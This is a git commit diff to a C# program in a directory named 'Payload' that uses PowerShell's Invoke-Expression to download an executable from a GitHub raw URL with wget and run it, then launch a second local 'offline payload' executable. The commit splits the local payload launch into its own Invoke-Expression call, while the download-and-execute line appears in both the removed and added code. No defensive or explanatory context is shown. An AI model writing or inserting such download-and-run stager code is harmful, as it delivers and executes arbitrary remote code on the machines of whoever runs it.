4cb46c0cc5ad1d449c5638ce00ec390d70fb37ee
NotSurprised <roro8016489@gmail.com>
2020-06-23 10:37:30 +0800

    20200623

--- Payload/Csharp2Powershell/Csharp2Powershell/Program.cs
+++ Payload/Csharp2Powershell/Csharp2Powershell/Program.cs
@@ -8,8 +8,13 @@ namespace Powershell
         {
             PowerShell ps = PowerShell.Create();
             ps.AddCommand("Invoke-Expression");
-            ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2PowershellOnlinePayload.exe';$output = 'Csharp2PowershellOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp2PowershellOnlinePayloadDownloaded.exe;Start-Process -FilePath 'Csharp2PowershellOfflinePayload.exe';");
+            ps.AddArgument("$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp2Powershell/Csharp2PowershellOnlinePayload.exe';$output = 'Csharp2PowershellOnlinePayloadDownloaded.exe';wget $url -outfile $output;./Csharp2PowershellOnlinePayloadDownloaded.exe;");
             ps.Invoke();
+
+            PowerShell ps1 = PowerShell.Create();
+            ps1.AddCommand("Invoke-Expression");
+            ps1.AddArgument("./Csharp2PowershellOfflinePayload.exe;");
+            ps1.Invoke();
         }
     }
 }
